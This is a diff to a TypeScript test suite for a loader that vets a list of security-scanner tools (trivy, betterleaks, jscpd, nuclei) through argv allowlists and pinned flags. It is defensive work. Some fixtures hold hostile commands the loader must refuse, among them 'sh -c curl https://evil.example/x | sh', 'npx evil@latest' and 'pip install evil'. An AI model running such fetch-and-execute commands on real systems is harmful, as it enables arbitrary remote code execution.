@@ -10,7 +10,7 @@ import {
   BETTERLEAKS_ALLOWED_FLAGS, effectiveProtectedPaths, loadReviewed, MUST_VERIFY, nearDuplicate, NUCLEI_ALLOWED_FLAGS, TRIVY_ALLOWED_FLAGS, NEVER_IMAGES, NEVER_NAME_ALLOW, NEVER_REPOS, neverImage, neverListed, packageExists, projectScriptFor,
   ReviewedListError, reviewedFor, TOOL_CATEGORIES,
 } from '../src/engine/reviewed.js';
-import { BETTERLEAKS_FORBIDDEN_FLAGS, BETTERLEAKS_FORBIDDEN_SUBCOMMANDS } from '../src/engine/tool-flags.js';
+import { ARGV_POLICIES, BETTERLEAKS_FORBIDDEN_FLAGS, BETTERLEAKS_FORBIDDEN_SUBCOMMANDS, type ArgvPolicy } from '../src/engine/tool-flags.js';
 import { BETTERLEAKS_GRAMMAR, NUCLEI_GRAMMAR, TRIVY_GRAMMAR, type FlagGrammar } from '../src/engine/tool-grammar.js';
 import { NEED_CATEGORIES, PROTECTED_PATHS_BASE, type Language, type Need, type ReviewedTool, type Service } from '../src/types.js';
 import { fakeFetch } from './helpers/fake-http.js';
@@ -67,6 +67,20 @@ function actionEntry(over: Entry = {}): Entry {
   };
 }
 
+/** gitleaks' locked flags (ruling P21), in the command and the fixed args. */
+const GITLEAKS_ARGS = ['--ignore-gitleaks-allow', '--redact', '--report-format', 'sarif', '--report-path', 'gitleaks.sarif', '--exit-code', '1'];
+
+/**
+ * Argv allowlists for the fixture-only ids (ruling P19 refuses a cli entry without one): the real table, plus the
+ * generic fixture tool `tool` (binEntry), the package fixture `linter` (pkgEntry) and a second gitleaks id.
+ */
+const FIXTURE_POLICIES: Record<string, ArgvPolicy> = {
+  ...ARGV_POLICIES,
+  'gitleaks-proven': ARGV_POLICIES.gitleaks as ArgvPolicy,
+  tool: { exe: 'tool', dialect: 'long', sub: [], flags: { format: { values: ['sarif'] }, output: 'output' }, config: { flag: '--config', content: 'x: 1\n' } },
+  linter: { exe: 'linter', dialect: 'long', sub: [], flags: { format: { values: ['sarif'] } } },
+};
+
 /** A reviewed release-binary entry (pinned by sha256). */
 function cliEntry(over: Entry = {}): Entry {
   const id = over.id ?? 'gitleaks';
@@ -76,10 +90,10 @@ function cliEntry(over: Entry = {}): Entry {
     id, categories, languages: ['any'], releasedAt: '2026-01-01T00:00:00Z',
     candidate: candidate(id, 'cli', repo, 'v8.30.1', { checksum: SUM }, categories),
     step: {
-      cli: { install: { method: 'github-release', package: 'gitleaks_8.30.1_linux_x64.tar.gz', version: 'v8.30.1' }, command: ['gitleaks', 'git', '--no-banner', '--report-format', 'sarif', '--report-path', 'gitleaks.sarif'] },
+      cli: { install: { method: 'github-release', package: 'gitleaks_8.30.1_linux_x64.tar.gz', version: 'v8.30.1' }, command: ['gitleaks', 'git', ...GITLEAKS_ARGS, '.'] },
       output: { path: 'gitleaks.sarif', format: 'sarif' },
     },
-    fixedInputs: { args: ['--report-format', 'sarif'], config: { content: '[extend]\nuseDefault = true\n', passAs: { flag: '--config' } } },
+    fixedInputs: { args: [...GITLEAKS_ARGS], config: { content: '[extend]\nuseDefault = true\n', passAs: { flag: '--config' } } },
     choices: {},
     configFiles: ['.gitleaks.toml', '.gitleaksignore'],
     reviewedBy: 'PENDING', reviewedAt: 'PENDING', proofs: 0,
@@ -109,7 +123,7 @@ function writeList(tools: Entry[]): string {
   return `${dir}/reviewed-tools.yml`;
 }
 
-const load = (tools: Entry[]) => loadReviewed(writeList(tools));
+const load = (tools: Entry[]) => loadReviewed(writeList(tools), { argvPolicies: FIXTURE_POLICIES });
 const rejects = (tools: Entry[], why?: RegExp) => expect(() => load(tools)).toThrow(why ?? ReviewedListError);
 
 const need = (id: string, over: Partial<Need> = {}): Need => ({
@@ -169,8 +183,9 @@ describe('loadReviewed', () => {
     const noFixed = cliEntry();
     delete noFixed.fixedInputs;
     rejects([noFixed]);
-    // present but empty is fine: cosign loads no config file from the repo
-    const empty = cliEntry({ id: 'cosign', repo: 'sigstore/cosign', categories: ['signing'] });
+    // present but empty is fine: creosote takes no fixed input and loads no config file pipegen lists
+    const empty = cliEntry({ id: 'creosote', repo: 'fredrikaverpil/creosote', categories: ['dead-code'] });
+    empty.step.cli.command = ['creosote'];
     empty.configFiles = [];
     empty.fixedInputs = {};
     empty.step.output = { path: '', format: 'none' };
@@ -356,8 +371,7 @@ describe('loadReviewed', () => {
     input.fixedInputs.config = { content: 'x: 1\n', passAs: { input: 'config-file' } };
     input.choices = { 'config-file': ['a.yml'] };
     rejects([input], /fixed/);
-    const ok = cliEntry();
-    ok.choices = { severity: ['high'] };
+    const ok = trivyEntry({ choices: { severity: ['CRITICAL', 'HIGH,CRITICAL'] } });
     expect(load([ok])).toHaveLength(1);
   });
 
@@ -431,7 +445,7 @@ function pkgEntry(method: 'npm' | 'pip', plugins: Entry[] | undefined, pkg = met
   e.candidate.version = version;
   e.candidate.pin = { checksum: method === 'npm' ? SRI : SUM };
   e.step.cli.install = { method, package: pkg, version };
-  e.step.cli.command = [method === 'npm' ? 'eslint' : 'st', '--format', 'sarif'];
+  e.step.cli.command = ['linter', '--format', 'sarif'];
   e.fixedInputs = { args: ['--format', 'sarif'] };
   e.configFiles = [];
   if (plugins !== undefined) e.step.cli.plugins = plugins;
@@ -446,19 +460,26 @@ function trivyEntry(over: { command?: string[]; args?: string[]; verifiedWith?: 
   return binEntry(repo, {
     id: 'trivy-config',
     command: over.command ?? ['trivy', 'config', ...TRIVY_FLAGS, '--format', 'sarif', '--output', 'tool.sarif', '--exit-code', '1', '.'],
-    args: over.args ?? [...TRIVY_FLAGS, '--format', 'sarif'],
+    args: over.args ?? [...TRIVY_FLAGS, '--format', 'sarif', '--exit-code', '1'],
     config: { content: 'cache:\n  backend: memory\n', passAs: { flag: '--config' } },
     verifiedWith: over.verifiedWith === undefined ? verified(repo) : over.verifiedWith,
     ...(over.choices === undefined ? {} : { choices: over.choices }),
   });
 }
-const jscpdEntry = (over: BinOver = {}) => binEntry('kucherenko/jscpd', {
-  id: 'jscpd', command: ['jscpd', '--reporters', 'sarif', '--output', '.'], args: ['--reporters', 'sarif'],
-  config: { content: '{ "threshold": 0 }\n', passAs: { flag: '--config' } }, verifiedWith: verified('kucherenko/jscpd'), ...over,
-});
-const blCmd = (...rest: string[]) => ['betterleaks', 'git', '--report-format', 'sarif', '--report-path', 'tool.sarif', ...rest];
+const JSCPD_ARGS = ['--baseline-from-ref', 'origin/main', '--fail-on-new-clones'];
+const jscpdEntry = (over: BinOver = {}) => {
+  const e = binEntry('kucherenko/jscpd', {
+    id: 'jscpd', command: ['jscpd', ...JSCPD_ARGS, '--reporters', 'sarif', '--output', 'jscpd-report', '.'], args: JSCPD_ARGS,
+    config: { content: '{}\n', passAs: { flag: '--config' } }, verifiedWith: verified('kucherenko/jscpd'), ...over,
+  });
+  e.step.output = { path: '', format: 'none' };
+  return e;
+};
+const blCmd = (...rest: string[]) => ['betterleaks', 'git', '--redact', '--report-format', 'sarif', '--report-path', 'tool.sarif', '--exit-code', '1', ...rest];
+/** betterleaks' fixed args (P18, P21): --redact, the report format, --exit-code 1. */
+const BL_ARGS = ['--redact', '--report-format', 'sarif', '--exit-code', '1'];
 const betterleaksEntry = (over: BinOver = {}) => binEntry('betterleaks/betterleaks', {
-  id: 'betterleaks', command: blCmd(), args: ['--report-format', 'sarif'],
+  id: 'betterleaks', command: blCmd(), args: BL_ARGS,
   config: { content: '[extend]\nuseDefault = true\n', passAs: { flag: '--config' } }, verifiedWith: verified('betterleaks/betterleaks'), ...over,
 });
 const nucleiCmd = (...rest: string[]) => ['nuclei', '-duc', '-t', NUCLEI_DIR, '-severity', 'medium,high,critical', '-sarif-export', 'tool.sarif', ...rest];
@@ -622,8 +643,8 @@ describe('loader rules (Plan P Task 5)', () => {
     rejects([trivyEntry({ command: [...TRIVY_FLAGS, 'trivy', 'image', ...tail] })], /trivy config\|image\|fs/);
     rejects([trivyEntry({ command: ['trivy', 'plugin', 'install', 'x'], args: [] })], /trivy config\|image\|fs/);
     // shorthands read as pflag does: combined bools and glued values
-    expect(load([trivyEntry({ command: ['trivy', 'image', ...TRIVY_FLAGS, '-fsarif', '-o=tool.sarif', '.'], args: TRIVY_FLAGS })])).toHaveLength(1);
-    expect(load([trivyEntry({ command: ['trivy', 'fs', ...TRIVY_FLAGS, '--scanners', 'license', '--severity', 'HIGH,CRITICAL', '--exit-code', '1', '.'], args: TRIVY_FLAGS })])).toHaveLength(1);
+    expect(load([trivyEntry({ command: ['trivy', 'image', ...TRIVY_FLAGS, '-fsarif', '-o=tool.sarif', '--exit-code', '1', '.'], args: [...TRIVY_FLAGS, '--exit-code', '1'] })])).toHaveLength(1);
+    expect(load([trivyEntry({ command: ['trivy', 'fs', ...TRIVY_FLAGS, '--scanners', 'license', '--severity', 'HIGH,CRITICAL', '--exit-code', '1', '.'], args: [...TRIVY_FLAGS, '--exit-code', '1'] })])).toHaveLength(1);
     // the environment can set any flag: no TRIVY_* env at all
     const env = trivyEntry();
     env.step.cli.env = { ['TRIVY_DISABLE_' + 'TELEMETRY']: 'false' };
@@ -632,7 +653,7 @@ describe('loader rules (Plan P Task 5)', () => {
     // choices: a known flag only, never a required or forbidden one, and no value that is a flag
     const image = (choices: Entry) => trivyEntry({ command: ['trivy', 'image', ...TRIVY_FLAGS, ...tail.slice(0, -1)], choices });
     expect(load([image({ severity: ['HIGH,CRITICAL'], 'ignore-unfixed': ['true', 'false'] })])).toHaveLength(1);
-    rejects([image({ severity: ['HIGH', '--disable-telemetry=false'] })], /choice value may not be a flag/);
+    rejects([image({ severity: ['CRITICAL', '--disable-telemetry=false'] })], /choice value may not be a flag/);
     rejects([image({ 'no-such': ['x'] })], /no flag --no-such/);
     rejects([image({ server: ['http://x'] })], /may not choose/);
     rejects([trivyEntry({ choices: { 'ignore-unfixed': ['true'] } })], /no flag --ignore-unfixed/); // an image-only flag on trivy config
@@ -688,7 +709,7 @@ describe('loader rules (Plan P Task 5)', () => {
   });
 
   it('reviewed: jscpd modes that run the embedding model and a semantic config are refused, whatever the spelling (fix round 1)', () => {
-    const cmd = ['jscpd', '--reporters', 'sarif', '--output', '.'];
+    const cmd = ['jscpd', ...JSCPD_ARGS, '--reporters', 'sarif', '--output', 'jscpd-report', '.'];
     for (const f of ['--compare', '--mcp', '--dashboard']) rejects([jscpdEntry({ command: [...cmd, f] })], /--compare, --mcp or --dashboard/);
     for (const f of ['--semantic-scope=all', '--semantic-url=http://x', '--semantic-download']) rejects([jscpdEntry({ command: [...cmd, f] })], /--semantic/);
     // the config is JSON, decoded before the check: escapes, nesting and case can't hide the key
@@ -697,7 +718,9 @@ describe('loader rules (Plan P Task 5)', () => {
     }
     rejects([jscpdEntry({ config: { content: 'semantic:\n  enabled: true\n', passAs: { flag: '--config' } } })], /semantic|JSON/);
     rejects([jscpdEntry({ config: { content: 'threshold: 0\n', passAs: { flag: '--config' } } })], /must be JSON/);
-    expect(load([jscpdEntry({ config: { content: '{ "threshold": 0, "ignore": ["**/fixtures/**"] }\n', passAs: { flag: '--config' } } })])).toHaveLength(1);
+    // ruling P19: the pinned config is exactly the reviewed one ({}), so any other key is refused too
+    rejects([jscpdEntry({ config: { content: '{ "threshold": 0, "ignore": ["**/fixtures/**"] }\n', passAs: { flag: '--config' } } })], /exactly the content reviewed/);
+    expect(load([jscpdEntry()])).toHaveLength(1);
   });
 
   it('reviewed: betterleaks with --validation, the validate subcommand or another forbidden flag refused; without a pinned --config refused (fix round 1: v1.9.0 names)', () => {
@@ -707,7 +730,7 @@ describe('loader rules (Plan P Task 5)', () => {
     }
     expect([...BETTERLEAKS_FORBIDDEN_SUBCOMMANDS]).toEqual(expect.arrayContaining(['validate', 'github', 'gitlab', 'huggingface', 's3']));
     expect(load([betterleaksEntry()])).toHaveLength(1);
-    expect(load([betterleaksEntry({ command: ['betterleaks', 'dir', '--report-format', 'sarif', '--report-path', 'tool.sarif', '.'] })])).toHaveLength(1);
+    expect(load([betterleaksEntry({ command: ['betterleaks', 'dir', '--redact', '--report-format', 'sarif', '--report-path', 'tool.sarif', '--exit-code', '1', '.'] })])).toHaveLength(1);
     for (const flag of BETTERLEAKS_FORBIDDEN_FLAGS) {
       const re = new RegExp(`never use ${flag}`);
       rejects([betterleaksEntry({ command: blCmd(flag) })], re);
@@ -722,7 +745,7 @@ describe('loader rules (Plan P Task 5)', () => {
     rejects([betterleaksEntry({ command: blCmd('--validation-env-vars', 'GITHUB_TOKEN') })], /never use --validation-env-vars/);
     rejects([betterleaksEntry({ command: blCmd('--validation-rps=5') })], /never use --validation-rps/);
     // subcommands that call out, and anything but a local scan
-    for (const sub of ['validate', 'github', 'gitlab', 'huggingface', 's3', 'analyze']) rejects([betterleaksEntry({ command: ['betterleaks', sub, '--report-format', 'sarif'] })], new RegExp(`never run ${sub}`));
+    for (const sub of ['validate', 'github', 'gitlab', 'huggingface', 's3', 'analyze']) rejects([betterleaksEntry({ command: ['betterleaks', sub, '--report-format', 'sarif'], args: ['--report-format', 'sarif'] })], new RegExp(`never run ${sub}`));
     rejects([betterleaksEntry({ command: ['betterleaks', 'config', 'show'], args: [] })], /runs only git, dir, stdin/);
     // a flag v1.9.0 doesn't have (fail closed)
     rejects([betterleaksEntry({ command: blCmd('--no-such-flag') })], /unknown flag --no-such-flag/);
@@ -839,7 +862,9 @@ describe('loader rules (Plan P Task 5)', () => {
     // hadolint, whose v2.15.1 attestation is signed from refs/heads/master (no tag identity to bind it to)
     expect([...MUST_VERIFY].sort()).toEqual(['aquasecurity/trivy', 'betterleaks/betterleaks', 'securego/gosec', 'stackrox/kube-linter']);
     expect(load([jscpdEntry({ verifiedWith: null })])).toHaveLength(1);
-    expect(load([binEntry('hadolint/hadolint', { id: 'hadolint', command: ['hadolint', '--format', 'sarif', 'Dockerfile'], verifiedWith: null })])).toHaveLength(1);
+    const hadolint = rawFile().tools.find((t) => t.id === 'hadolint') as Entry;
+    expect(hadolint.verifiedWith).toBeUndefined();
+    expect(load([hadolint])).toHaveLength(1);
     const entries: Record<string, (v: Entry | null, repo?: string) => Entry> = {
       'aquasecurity/trivy': (v, repo) => trivyEntry({ verifiedWith: v, ...(repo === undefined ? {} : { repo }) }),
       'betterleaks/betterleaks': (v, repo) => (repo === undefined ? betterleaksEntry({ verifiedWith: v }) : { ...betterleaksEntry({ verifiedWith: v }), candidate: { ...betterleaksEntry().candidate, repo, name: repo } }),
@@ -981,48 +1006,50 @@ describe('loader rules (Plan P Task 5)', () => {
       rejects([nucleiEntry({ command: nucleiCmd(f, ...(['-V', '-l', '-o'].includes(f) ? ['x=y'] : [])) })], /allowlist, ruling P13|unknown flag/); // goflags' -h is built in: unknown
     }
     // the fixed args are read with the same grammar
-    rejects([betterleaksEntry({ command: blCmd('--no-color'), args: ['--report-format', 'sarif', '--no-color'] })], /allowlist, ruling P13/);
+    rejects([betterleaksEntry({ command: blCmd('--no-color'), args: [...BL_ARGS, '--no-color'] })], /allowlist, ruling P13/);
     rejects([trivyEntry({ command: ['trivy', 'image', ...TRIVY_FLAGS, '--no-such', ...tail], args: [...TRIVY_FLAGS, '--no-such'] })], /unknown flag --no-such/);
     // allowlisted flags load (the Task 6 trivy-licence, image and betterleaks shapes)
-    expect(load([trivyEntry({ command: ['trivy', 'fs', ...TRIVY_FLAGS, '--scanners', 'license', '--severity', 'HIGH,CRITICAL', '--exit-code', '1', '.'], args: TRIVY_FLAGS })])).toHaveLength(1);
-    expect(load([betterleaksEntry({ command: blCmd('--no-banner', '--redact', '--ignore-gitleaks-allow', '--exit-code', '1'), args: ['--report-format', 'sarif', '--exit-code', '1'] })])).toHaveLength(1);
+    expect(load([trivyEntry({ command: ['trivy', 'fs', ...TRIVY_FLAGS, '--scanners', 'license', '--severity', 'HIGH,CRITICAL', '--exit-code', '1', '.'], args: [...TRIVY_FLAGS, '--exit-code', '1'] })])).toHaveLength(1);
+    expect(load([betterleaksEntry({ command: blCmd('--no-banner', '--ignore-gitleaks-allow'), args: BL_ARGS })])).toHaveLength(1);
     expect(load([nucleiEntry({ command: nucleiCmd('-u', 'http://localhost:8080', '-ni', '-as') })])).toHaveLength(1);
   });
 
   it('reviewed: betterleaks --report-path is the output file, never - (findings with secrets to the CI log); --exit-code is a fixed arg (Task 5 carry-forward)', () => {
-    const cmd = (path: string, ...rest: string[]) => ['betterleaks', 'git', '--report-format', 'sarif', '--report-path', path, ...rest];
+    // without --exit-code (the cases below add their own); --redact as P21 requires
+    const blCmd = (...rest: string[]) => ['betterleaks', 'git', '--redact', '--report-format', 'sarif', '--report-path', 'tool.sarif', ...rest];
+    const cmd = (path: string, ...rest: string[]) => ['betterleaks', 'git', '--redact', '--report-format', 'sarif', '--report-path', path, '--exit-code', '1', ...rest];
     for (const path of ['-', '/dev/stdout', '/dev/stderr', '/proc/self/fd/1', 'other.sarif']) {
       rejects([betterleaksEntry({ command: cmd(path) })], /--report-path/);
-      rejects([betterleaksEntry({ command: [...blCmd(), `--report-path=${path}`] })], /--report-path/); // a later value wins
-      rejects([betterleaksEntry({ command: [...blCmd(), '-r', path] })], /--report-path/);
-      rejects([betterleaksEntry({ command: [...blCmd(), '--report-path', path], args: ['--report-format', 'sarif', '--report-path', path] })], /--report-path/);
+      rejects([betterleaksEntry({ command: [...blCmd('--exit-code', '1'), `--report-path=${path}`] })], /--report-path/); // a later value wins
+      rejects([betterleaksEntry({ command: [...blCmd('--exit-code', '1'), '-r', path] })], /--report-path/);
+      rejects([betterleaksEntry({ command: [...blCmd('--exit-code', '1'), '--report-path', path], args: ['--redact', '--report-format', 'sarif', '--exit-code', '1', '--report-path', path] })], /--report-path/);
     }
     const dash = betterleaksEntry({ command: cmd('-') });
     dash.step.output = { path: '-', format: 'sarif' };
     rejects([dash], /--report-path/);
     // --exit-code: set by the template (in the command and the fixed args, same value, not 0), never chosen by the AI
-    const fixed = ['--report-format', 'sarif', '--exit-code', '1'];
+    const fixed = ['--redact', '--report-format', 'sarif', '--exit-code', '1'];
     expect(load([betterleaksEntry({ command: blCmd('--exit-code', '1'), args: fixed })])).toHaveLength(1);
-    rejects([betterleaksEntry({ command: blCmd('--exit-code', '1') })], /--exit-code/); // not a fixed arg
+    rejects([betterleaksEntry({ command: blCmd('--exit-code', '1'), args: ['--redact', '--report-format', 'sarif'] })], /--exit-code/); // not a fixed arg
     rejects([betterleaksEntry({ command: blCmd('--exit-code', '1', '--exit-code', '0'), args: fixed })], /--exit-code/);
-    rejects([betterleaksEntry({ command: blCmd('--exit-code', '0'), args: ['--report-format', 'sarif', '--exit-code', '0'] })], /--exit-code/);
-    rejects([betterleaksEntry({ choices: { 'exit-code': ['0', '1'] } })], /exit-code/);
+    rejects([betterleaksEntry({ command: blCmd('--exit-code', '0'), args: ['--redact', '--report-format', 'sarif', '--exit-code', '0'] })], /--exit-code/);
+    rejects([betterleaksEntry({ command: blCmd('--exit-code', '1'), args: fixed, choices: { 'exit-code': ['0', '1'] } })], /exit-code/);
     // security scan finding (fail-open): both sources are checked, not only the command
-    rejects([betterleaksEntry({ command: [...blCmd(), '--', '--exit-code', '0'], args: ['--report-format', 'sarif', '--exit-code', '0'] })], /--exit-code/); // fixed-only 0
-    rejects([betterleaksEntry({ command: [...blCmd(), '--', '--exit-code', '1'], args: ['--report-format', 'sarif', '--exit-code', '1'] })], /--exit-code/); // fixed-only 1
-    rejects([betterleaksEntry({ command: blCmd('--exit-code', '2'), args: ['--report-format', 'sarif'] })], /--exit-code/); // command-only
-    rejects([betterleaksEntry({ command: blCmd('--exit-code', '1', '--exit-code', '2'), args: ['--report-format', 'sarif', '--exit-code', '1'] })], /--exit-code/); // both, different
+    rejects([betterleaksEntry({ command: [...blCmd(), '--', '--exit-code', '0'], args: ['--redact', '--report-format', 'sarif', '--exit-code', '0'] })], /--exit-code/); // fixed-only 0
+    rejects([betterleaksEntry({ command: [...blCmd(), '--', '--exit-code', '1'], args: ['--redact', '--report-format', 'sarif', '--exit-code', '1'] })], /--exit-code/); // fixed-only 1
+    rejects([betterleaksEntry({ command: blCmd('--exit-code', '2'), args: ['--redact', '--report-format', 'sarif'] })], /--exit-code/); // command-only
+    rejects([betterleaksEntry({ command: blCmd('--exit-code', '1', '--exit-code', '2'), args: ['--redact', '--report-format', 'sarif', '--exit-code', '1'] })], /--exit-code/); // both, different
     for (const zero of ['00', '+0', '0x0', '-0', ' 1', '1 ', '01']) {
-      rejects([betterleaksEntry({ command: blCmd('--exit-code', zero), args: ['--report-format', 'sarif', '--exit-code', zero] })], /--exit-code/);
-      rejects([betterleaksEntry({ command: blCmd(`--exit-code=${zero}`), args: ['--report-format', 'sarif', `--exit-code=${zero}`] })], /--exit-code/);
+      rejects([betterleaksEntry({ command: blCmd('--exit-code', zero), args: ['--redact', '--report-format', 'sarif', '--exit-code', zero] })], /--exit-code/);
+      rejects([betterleaksEntry({ command: blCmd(`--exit-code=${zero}`), args: ['--redact', '--report-format', 'sarif', `--exit-code=${zero}`] })], /--exit-code/);
     }
     // ruling P18: exactly 1. 256 and 512 wrap to exit status 0; 2 is refused too (one fixed value)
     for (const code of ['2', '256', '512', '257']) {
-      rejects([betterleaksEntry({ command: blCmd('--exit-code', code), args: ['--report-format', 'sarif', '--exit-code', code] })], /--exit-code/);
-      rejects([betterleaksEntry({ command: blCmd(`--exit-code=${code}`), args: ['--report-format', 'sarif', `--exit-code=${code}`] })], /--exit-code/);
+      rejects([betterleaksEntry({ command: blCmd('--exit-code', code), args: ['--redact', '--report-format', 'sarif', '--exit-code', code] })], /--exit-code/);
+      rejects([betterleaksEntry({ command: blCmd(`--exit-code=${code}`), args: ['--redact', '--report-format', 'sarif', `--exit-code=${code}`] })], /--exit-code/);
     }
     // an earlier 0 overridden by a later 1 is still refused (every value must be 1)
-    rejects([betterleaksEntry({ command: blCmd('--exit-code', '0', '--exit-code', '1'), args: ['--report-format', 'sarif', '--exit-code', '0', '--exit-code', '1'] })], /--exit-code/);
+    rejects([betterleaksEntry({ command: blCmd('--exit-code', '0', '--exit-code', '1'), args: ['--redact', '--report-format', 'sarif', '--exit-code', '0', '--exit-code', '1'] })], /--exit-code/);
   });
 
   it('reviewed: betterleaks --redact takes an optional value, as pflag reads it (NoOptDefVal "100", v1.9.0 cmd/root.go:95)', () => {
@@ -1032,8 +1059,11 @@ describe('loader rules (Plan P Task 5)', () => {
     rejects([betterleaksEntry({ command: blCmd('--redact', '--config=/tmp/evil.toml') })], /pinned --config/);
     rejects([betterleaksEntry({ command: blCmd('--redact', '-c/tmp/evil.toml') })], /pinned --config/);
     rejects([betterleaksEntry({ command: blCmd('--redact', '--verbose') })], /never use --verbose/);
-    expect(load([betterleaksEntry({ command: blCmd('--redact=50') })])).toHaveLength(1);
+    expect(load([betterleaksEntry({ command: blCmd('--redact=100') })])).toHaveLength(1);
     expect(load([betterleaksEntry({ command: blCmd('--redact') })])).toHaveLength(1);
+    // P21: never partly redacted, never without --redact
+    for (const r of ['--redact=50', '--redact=0']) rejects([betterleaksEntry({ command: blCmd(r) })], /--redact/);
+    rejects([betterleaksEntry({ command: blCmd().filter((x) => x !== '--redact'), args: BL_ARGS.filter((x) => x !== '--redact') })], /--redact/);
   });
 
   it('reviewed: trivy\'s pinned config is YAML with only cache.backend: memory (ruling P13)', () => {
@@ -1071,8 +1101,11 @@ describe('Task 5 review probes (fix round 1)', () => {
     step: { cli: { install: { method: 'github-release', package: pkg, version }, command }, output: { path: '', format: 'none' } },
     fixedInputs: {}, choices: {}, configFiles: [], reviewedBy: 'PENDING', reviewedAt: 'PENDING', proofs: 0, ...extra,
   });
-  const pbetterleaks = () => pcli('betterleaks', 'betterleaks/betterleaks', 'v1.9.0', 'betterleaks_1.9.0_linux_x64.tar.gz', ['betterleaks', 'dir', '--report-format', 'sarif', '.'],
-    { fixedInputs: { args: ['--report-format', 'sarif'], config: { content: '[extend]\nuseDefault = true\n', passAs: { flag: '--config' } } }, verifiedWith: vw('betterleaks/betterleaks', 'refs/tags/v1.9.0') });
+  const pbetterleaks = () => pcli('betterleaks', 'betterleaks/betterleaks', 'v1.9.0', 'betterleaks_1.9.0_linux_x64.tar.gz', ['betterleaks', 'dir', '--redact', '--report-format', 'sarif', '--report-path', 'b.sarif', '--exit-code', '1', '.'],
+    {
+      fixedInputs: { args: ['--redact', '--report-format', 'sarif', '--exit-code', '1'], config: { content: '[extend]\nuseDefault = true\n', passAs: { flag: '--config' } } },
+      verifiedWith: vw('betterleaks/betterleaks', 'refs/tags/v1.9.0'), step: { cli: { install: { method: 'github-release', package: 'betterleaks_1.9.0_linux_x64.tar.gz', version: 'v1.9.0' }, command: ['betterleaks', 'dir', '--redact', '--report-format', 'sarif', '--report-path', 'b.sarif', '--exit-code', '1', '.'] }, output: { path: 'b.sarif', format: 'sarif' } },
+    });
   const PNUC_ENV = { [NUCLEI_URL_ENV]: NUCLEI_URL, [NUCLEI_SUM_ENV]: H };
   const pnuclei = () => {
     const e = pcli('nuclei', 'projectdiscovery/nuclei', 'v3.11.1', 'nuclei_3.11.1_linux_amd64.zip', ['nuclei', '-duc', '-t', NUCLEI_DIR, '-u', 'http://localhost:8080', '-sarif-export', 'n.sarif']);
@@ -1084,8 +1117,8 @@ describe('Task 5 review probes (fix round 1)', () => {
   };
   // the review's jscpd base used refs/heads/master; branch identities are refused now, so the base is signed at its tag
   const pjscpd = (ref = 'refs/tags/v5.4.2') => {
-    const e = pcli('jscpd', 'kucherenko/jscpd', 'v5.4.2', 'jscpd-x86_64-unknown-linux-gnu.tar.gz', ['jscpd', '.'],
-      { fixedInputs: { config: { content: '{"threshold": 0}\n', passAs: { flag: '--config' } } }, verifiedWith: vw('kucherenko/jscpd', ref) });
+    const e = pcli('jscpd', 'kucherenko/jscpd', 'v5.4.2', 'jscpd-x86_64-unknown-linux-gnu.tar.gz', ['jscpd', ...JSCPD_ARGS, '.'],
+      { fixedInputs: { args: [...JSCPD_ARGS], config: { content: '{}\n', passAs: { flag: '--config' } } }, verifiedWith: vw('kucherenko/jscpd', ref) });
     e.categories = ['duplication'];
     e.candidate.categories = ['duplication'];
     return e;
@@ -1659,6 +1692,289 @@ describe('data/reviewed-tools.yml', () => {
     const young = cliEntry();
     young.releasedAt = '2026-10-20T00:00:00Z'; // the fixture list is pinned on 2026-10-26
     rejects([young], /cooldown/);
+  });
+});
+
+// ---------- Task 6 review, fix round 1 (rulings P19-P27): the review's probes as tests ----------
+
+describe('Task 6 review fix round 1 (P19-P27)', () => {
+  /** A real entry, cloned, changed, and loaded alone with the real list's pinnedOn (so the real releases pass the cooldown). */
+  const realEntry = (id: string): Entry => structuredClone(rawFile().tools.find((t) => t.id === id) as Entry);
+  const loadAt = (tools: Entry[]) => {
+    const dir = makeTempDir();
+    writeIn(dir, 'reviewed-tools.yml', stringify({ pinnedOn: rawFile().pinnedOn, tools }));
+    return loadReviewed(`${dir}/reviewed-tools.yml`);
+  };
+  const refused = (e: Entry, why: RegExp) => expect(() => loadAt([e])).toThrow(why);
+  /** Sets the same words in the command and the fixed args (a change a careless edit would make in both places). */
+  const both = (e: Entry, change: (xs: string[]) => string[]) => {
+    e.step.cli.command = [e.step.cli.command[0], ...change(e.step.cli.command.slice(1))];
+    e.fixedInputs.args = change(e.fixedInputs.args ?? []);
+    return e;
+  };
+  const without = (...drop: string[]) => (xs: string[]) => xs.filter((x) => !drop.includes(x));
+  /** Flags go first, so Go-style tools (which stop at the first path) read them as flags too. */
+  const plus = (...add: string[]) => (xs: string[]) => [...add, ...xs];
+  const swap = (from: string, to: string) => (xs: string[]) => xs.map((x) => (x === from ? to : x));
+
+  it('P19 (C1): every real cli entry has an argv allowlist, and runs exactly its own executable', () => {
+    const cli = rawFile().tools.filter((t) => t.candidate.kind === 'cli');
+    expect(cli.length).toBeGreaterThan(30);
+    for (const t of cli) {
+      expect(Object.hasOwn(ARGV_POLICIES, t.id), t.id).toBe(true);
+      expect(t.step.cli.command[0], t.id).toBe(ARGV_POLICIES[t.id]?.exe);
+    }
+    expect(loadAt(cli)).toHaveLength(cli.length);
+  });
+
+  it('P19 (C1, probes 1-4, 20, 27): launchers, shells, package managers, paths, renamed binaries and unknown ids are refused', () => {
+    const RUNS = /runs \S+ itself as command\[0\]/;
+    for (const id of ['biome', 'eslint', 'prettier', 'knip', 'ruff', 'mypy', 'gosec', 'hadolint', 'coverage-py', 'schemathesis', 'bandit']) {
+      const e = realEntry(id);
+      e.step.cli.command = ['npx', 'evil@latest'];
+      e.fixedInputs.args = [];
+      refused(e, RUNS);
+    }
+    const shell = realEntry('biome');
+    shell.step.cli.command = ['sh', '-c', 'curl https://evil.example/x | sh'];
+    shell.fixedInputs.args = [];
+    refused(shell, RUNS);
+    const pip = realEntry('ruff');
+    pip.step.cli.command = ['pip', 'install', 'evil'];
+    pip.fixedInputs.args = [];
+    refused(pip, RUNS);
+    const py = realEntry('mypy');
+    py.step.cli.command = ['python', '-m', 'pip', 'install', 'x'];
+    py.fixedInputs.args = [];
+    refused(py, RUNS);
+    for (const exe of ['gosec2', '/usr/bin/gosec', './gosec', 'GOSEC']) {
+      const e = realEntry('gosec');
+      e.step.cli.command = [exe, ...e.step.cli.command.slice(1)];
+      refused(e, RUNS);
+    }
+    // a look-alike under its own id has no allowlist (probe 27): refused, verifiedWith or not
+    const look = realEntry('gosec');
+    look.id = 'gosec2';
+    look.candidate.id = 'gosec2';
+    look.candidate.repo = 'evil/gosec2';
+    look.candidate.name = 'evil/gosec2';
+    look.step.cli.command = ['gosec2', ...look.step.cli.command.slice(1)];
+    delete look.verifiedWith;
+    refused(look, /verifiedWith is required/); // still gosec's tool (T5)
